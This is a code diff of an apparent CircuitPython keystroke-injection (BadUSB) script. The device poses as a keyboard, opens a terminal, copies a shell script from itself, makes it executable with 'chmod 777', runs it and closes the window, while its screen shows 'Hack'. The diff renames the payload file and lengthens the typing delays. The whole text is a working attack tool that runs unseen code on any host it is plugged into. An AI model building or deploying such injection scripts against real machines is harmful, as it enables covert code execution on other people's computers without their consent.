@@ -69,13 +69,13 @@ try:
     inner_rectangle()
     print_onTFT("Hack", 20, 60)
     
-    path = "exemple.sh"
+    path = "launch.sh"
     
     keyboard = Keyboard(usb_hid.devices)
     keyboard_layout = KeyboardLayoutUS(keyboard)
 
     keyboard.send(Keycode.CONTROL, Keycode.ALT, Keycode.T)
-    time.sleep(0.6)
+    time.sleep(0.7)
     
     keyboard_layout.write("cp ..")
     keyboard.send(Keycode.TAB)
@@ -90,17 +90,17 @@ try:
     keyboard.send(Keycode.TAB)
     keyboard.send(Keycode.TAB)
     keyboard.send(Keycode.ENTER)
-    time.sleep(0.6)
+    time.sleep(0.7)
     
     keyboard_layout.write(f"chmod 777 {path}")
     keyboard.send(Keycode.ENTER)
-    time.sleep(0.6)
+    time.sleep(0.7)
     
     keyboard_layout.write(".")
     keyboard.send(Keycode.TAB)
     keyboard_layout.write(f"{path}")
     keyboard.send(Keycode.ENTER)
-    time.sleep(0.6)
+    time.sleep(0.7)
     
     keyboard.send(Keycode.ALT, Keycode.F4)
     
